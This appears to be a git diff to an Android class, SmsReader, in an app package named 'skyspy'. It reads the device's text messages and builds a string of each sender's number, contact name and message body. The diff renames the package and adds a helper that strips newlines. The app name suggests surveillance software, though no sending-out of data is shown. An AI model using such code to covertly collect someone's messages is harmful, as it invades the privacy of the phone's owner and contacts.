@@ -1,4 +1,4 @@
-package com.example.skyspy.app.sms.logic;
+package com.example.skyspy.app.sms;
 
 import android.content.Context;
 import android.database.Cursor;
@@ -33,8 +33,8 @@ public class SmsReader {
                 sms += "Number: "+number+"\n";
             }
             sms += "Name: "+getContactName(number)+"\n";
-            sms += "Body: "+cur.getString(cur.getColumnIndexOrThrow("body"))+"\n";
-            sms += "_______________"+"\n";
+            sms += "Body: "+removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
+            sms += "_______________"+"\n\n";
         }
         cur.close();
         return sms;
@@ -98,5 +98,10 @@ public class SmsReader {
         Date date = new Date(timeMs);
         DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
         return df.format(date);
+    }
+
+    public String removeNewLine(String str){
+        str = str.replace("\n"," ");
+        return str;
     }
 }
